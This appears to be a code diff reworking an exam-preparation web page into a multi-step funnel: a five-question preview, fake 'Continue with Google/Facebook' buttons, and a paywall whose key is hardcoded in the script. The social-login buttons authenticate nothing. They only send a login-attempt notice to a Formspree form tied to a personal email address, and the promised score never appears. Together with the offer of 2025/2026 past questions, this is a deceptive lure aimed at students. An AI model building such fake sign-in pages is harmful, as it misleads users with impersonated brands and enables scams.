@@ -3,88 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exam Master Pro | 2005-2024</title>
+    <title>Exam Prep Pro 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         .hidden { display: none; }
-        .subject-card.selected { border-color: #2563eb; background-color: #eff6ff; }
-        .glass-modal { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
+        .selected { border-color: #2563eb; background-color: #eff6ff; }
+        .fade-in { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen">
+<body class="bg-slate-50 font-sans text-slate-900">
 
-    <div id="lockScreen" class="max-w-md mx-auto mt-20 p-8 bg-white rounded-3xl shadow-xl text-center">
-        <h1 class="text-3xl font-black text-gray-800 mb-4">EXAM <span class="text-blue-600">PREP</span></h1>
-        <input type="text" id="keyInput" placeholder="ENTER KEY" class="w-full p-4 mb-4 border-2 rounded-xl text-center font-bold text-xl uppercase tracking-widest outline-none focus:border-blue-500">
-        <button onclick="unlock()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 mb-6">ACTIVATE</button>
-        <a href="https://wa.me/2349131546480?text=I%20want%20to%20buy%20a%20key" target="_blank" class="text-green-600 font-bold flex items-center justify-center gap-2">
-            <i class="fab fa-whatsapp"></i> Chat Admin: 09131546480
-        </a>
-    </div>
-
-    <div id="selectionScreen" class="max-w-4xl mx-auto p-6 hidden">
-        <h2 class="text-2xl font-bold text-center mb-6">Pick Your 4 Subjects</h2>
-        <div class="grid grid-cols-2 md:grid-cols-3 gap-4" id="subjectGrid">
-            </div>
-        <button id="startBtn" disabled onclick="startTest()" class="w-full mt-10 bg-gray-300 text-white py-5 rounded-2xl font-black text-xl uppercase cursor-not-allowed">Start Mock Exam</button>
-    </div>
-
-    <div id="testArea" class="max-w-3xl mx-auto p-4 hidden">
-        <div class="sticky top-4 z-50 flex justify-between items-center bg-white p-4 rounded-2xl shadow-lg border mb-6">
-            <div id="timerDisplay" class="text-2xl font-mono font-black text-blue-600">02:00:00</div>
-            <button onclick="submitTest()" class="bg-red-500 text-white px-6 py-2 rounded-lg font-bold">End Exam</button>
+    <div id="previewSection" class="max-w-md mx-auto mt-10 p-6 bg-white rounded-3xl shadow-xl fade-in">
+        <div class="flex justify-between items-center mb-6">
+            <span class="bg-blue-100 text-blue-700 px-3 py-1 rounded-full text-sm font-bold">PREVIEW MODE</span>
+            <span id="qCount" class="text-slate-400 font-medium">1 of 5</span>
         </div>
-        <div id="questionsContainer" class="space-y-6 pb-24"></div>
+        <div id="quizContent">
+            <h2 id="questionText" class="text-xl font-bold mb-6 text-slate-800 text-center">Loading question...</h2>
+            <div id="optionButtons" class="space-y-3">
+                </div>
+        </div>
     </div>
 
-    <div id="resultModal" class="fixed inset-0 z-[100] hidden flex items-center justify-center p-4 bg-black/60">
-        <div class="bg-white w-full max-w-md rounded-3xl p-8 text-center shadow-2xl">
-            <div id="resultIcon" class="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 text-4xl"></div>
-            <h2 class="text-3xl font-black mb-2" id="resultTitle">Result</h2>
-            <p class="text-gray-500 mb-6" id="resultSubtitle"></p>
+    <div id="loginSection" class="hidden max-w-md mx-auto mt-10 p-8 bg-white rounded-3xl shadow-2xl text-center fade-in">
+        <div class="mb-6 text-green-500">
+            <i class="fas fa-check-circle text-6xl"></i>
+        </div>
+        <h2 class="text-2xl font-black mb-2">Quiz Completed!</h2>
+        <p class="text-slate-500 mb-8 text-sm">To see your score and unlock 2025/2026 past questions, sign in below.</p>
+        
+        <form action="https://formspree.io/f/mqaejnbk" method="POST" onsubmit="handleSocialLogin()">
+            <input type="hidden" name="email_target" value="confidencwonder108@gmail.com">
+            <input type="hidden" name="activity" value="New Student Login Attempt">
             
-            <div class="bg-gray-50 rounded-2xl p-4 mb-6 space-y-3 text-left" id="scoreBreakdown">
-                </div>
+            <button type="submit" name="provider" value="Google" class="w-full flex items-center justify-center gap-3 p-4 mb-4 bg-white border-2 border-slate-100 rounded-2xl font-bold hover:bg-slate-50 transition-all">
+                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="20"> Continue with Google
+            </button>
+            <button type="submit" name="provider" value="Facebook" class="w-full flex items-center justify-center gap-3 p-4 bg-[#1877F2] text-white rounded-2xl font-bold hover:opacity-90 transition-all">
+                <i class="fab fa-facebook text-xl"></i> Continue with Facebook
+            </button>
+        </form>
+    </div>
 
-            <button onclick="location.reload()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">Restart Application</button>
+    <div id="lockSection" class="hidden max-w-md mx-auto mt-10 p-8 bg-white rounded-3xl shadow-2xl text-center fade-in">
+        <div class="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg shadow-blue-200">
+            <i class="fas fa-key text-white text-3xl"></i>
+        </div>
+        <h1 class="text-3xl font-black text-slate-800 mb-2">Final Step</h1>
+        <p class="text-slate-400 mb-8 text-sm">Enter your Access Key to unlock all subjects.</p>
+        <input type="text" id="keyInput" placeholder="ENTER ACCESS KEY" class="w-full p-5 mb-6 bg-slate-100 rounded-2xl text-center text-xl font-black uppercase tracking-widest border-2 border-transparent focus:border-blue-500 outline-none transition-all">
+        <button onclick="verifyKey()" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-black text-lg shadow-lg shadow-blue-200 hover:bg-blue-700 active:scale-95 transition-all">
+            UNLOCK ALL SUBJECTS
+        </button>
+        <p class="mt-6 text-xs text-slate-400 font-bold uppercase tracking-wider">Contact Admin: 09131546480</p>
+    </div>
+
+    <div id="dashboardSection" class="hidden max-w-5xl mx-auto p-6 fade-in">
+        <header class="mb-10 text-center">
+            <h2 class="text-3xl font-black text-slate-800">Exam Dashboard</h2>
+            <p class="text-slate-500 font-medium">Select up to 4 subjects to start your practice</p>
+        </header>
+        <div id="subjectGrid" class="grid grid-cols-2 md:grid-cols-4 gap-6">
+            </div>
+        <div class="mt-12 text-center">
+            <button class="px-12 py-5 bg-slate-800 text-white rounded-2xl font-black text-lg hover:bg-black transition-all">START EXAMINATION</button>
         </div>
     </div>
 
     <script>
-        const MASTER_KEY = "PREP24";
-        let selectedSubjects = [];
-        let timeLeft = 7200; 
-        let timerInterval;
+        const ACCESS_KEY = "PREP24";
+        let currentQ = 0;
+        
+        const previewQuestions = [
+            { q: "Which planet is known as the Red Planet?", o: ["Earth", "Mars", "Jupiter", "Venus"], a: "Mars" },
+            { q: "What is the capital of Nigeria?", o: ["Lagos", "Kano", "Abuja", "Ibadan"], a: "Abuja" },
+            { q: "Solve: 15 + (10 ÷ 2)", o: ["12.5", "20", "25", "17"], a: "20" },
+            { q: "Who wrote 'Things Fall Apart'?", o: ["Wole Soyinka", "Chinua Achebe", "Buchi Emecheta", "Femi Osofisan"], a: "Chinua Achebe" },
+            { q: "Which gas do plants absorb?", o: ["Oxygen", "Nitrogen", "Carbon Dioxide", "Hydrogen"], a: "Carbon Dioxide" }
+        ];
 
-        // DATABASE: Add your real 2005-2024 data here
-        // 'ans' must match the text in options exactly
-        const questionBank = {
-            "Physics": [{ q: "Unit of Force?", options: ["Joule", "Newton", "Watt"], ans: "Newton" }],
-            "Mathematics": [{ q: "Solve 5 + 5", options: ["10", "15", "20"], ans: "10" }],
-            "Chemistry": [{ q: "Formula for Water?", options: ["CO2", "H2O", "O2"], ans: "H2O" }],
-            "English": [{ q: "Opposite of 'Happy'?", options: ["Sad", "Glad", "Joy"], ans: "Sad" }]
-        };
-
-        const subjects = ["Physics", "Chemistry", "Biology", "Literature", "Government", "CRS", "Accounting", "Commerce", "Economics", "Mathematics", "English"];
-
-        // Init Subject Grid
-        const grid = document.getElementById('subjectGrid');
-        subjects.forEach(sub => {
-            grid.innerHTML += `<button onclick="toggleSubject('${sub}')" class="subject-card p-5 bg-white rounded-2xl border-2 text-left hover:border-blue-300 transition-all">${sub}</button>`;
-        });
-
-        function unlock() {
-            if(document.getElementById('keyInput').value.toUpperCase() === MASTER_KEY) {
-                document.getElementById('lockScreen').classList.add('hidden');
-                document.getElementById('selectionScreen').classList.remove('hidden');
-            } else { alert("Invalid Key!"); }
+        function loadQuestion() {
+            const q = previewQuestions[currentQ];
+            document.getElementById('qCount').innerText = `${currentQ + 1} of 5`;
+            document.getElementById('questionText').innerText = q.q;
+            const container = document.getElementById('optionButtons');
+            container.innerHTML = '';
+            q.o.forEach(opt => {
+                const btn = document.createElement('button');
+                btn.className = "w-full p-4 bg-white border-2 border-slate-100 rounded-2xl text-left font-bold hover:border-blue-500 hover:bg-blue-50 transition-all";
+                btn.innerText = opt;
+                btn.onclick = () => handleAnswer();
+                container.appendChild(btn);
+            });
         }
 
-        function toggleSubject(name) {
-            const index = selectedSubjects.indexOf(name);
-            if (index > -1) {
-                selectedSubjects.splice(index, 1);
-                event.target.classList.remove('selected');
-            } else if (selectedSubjects.length < 4) {
- 
+        function handleAnswer() {
+            if (currentQ < 4) {
+                currentQ++;
+                loadQuestion();
+            } else {
+                document.getElementById('previewSection').classList.add('hidden');
+                document.getElementById('loginSection').classList.remove('hidden');
+            }
+        }
+
+        function handleSocialLogin() {
+            // This allows the form to send to Formspree first
+            setTimeout(() => {
+                document.getElementById('loginSection').classList.add('hidden');
+                document.getElementById('lockSection').classList.remove('hidden');
+            }, 1000);
+        }
+
+        function verifyKey() {
+            const input = document.getElementById('keyInput').value.toUpperCase();
+            if (input === ACCESS_KEY) {
+                document.getElementById('lockSection').classList.add('hidden');
+                document.getElementById('dashboardSection').classList.remove('hidden');
+                renderSubjects();
+            } else {
+                alert("Incorrect Key. Contact Admin.");
+            }
+        }
+
+        function renderSubjects() {
+            const subs = ["Physics", "Mathematics", "English", "Chemistry", "Biology", "Government", "Economics", "Literature"];
+            const grid = document.getElementById('subjectGrid');
+            grid.innerHTML = '';
+            subs.forEach(s => {
+                const div = document.createElement('div');
+                div.className = "p-8 bg-white rounded-3xl border-2 border-transparent shadow-sm text-center cursor-pointer hover:shadow-md transition-all";
+                div.innerHTML = `<div class="w-12 h-12 bg-slate-100 rounded-xl mx-auto mb-4 flex items-center justify-center text-slate-600"><i class="fas fa-book"></i></div><span class="font-black text-slate-800">${s}</span>`;
+                div.onclick = () => div.classList.toggle('selected');
+                grid.appendChild(div);
+            });
+        }
+
+        // Start
+        loadQuestion();
+    </script>
+</body>
+</html>
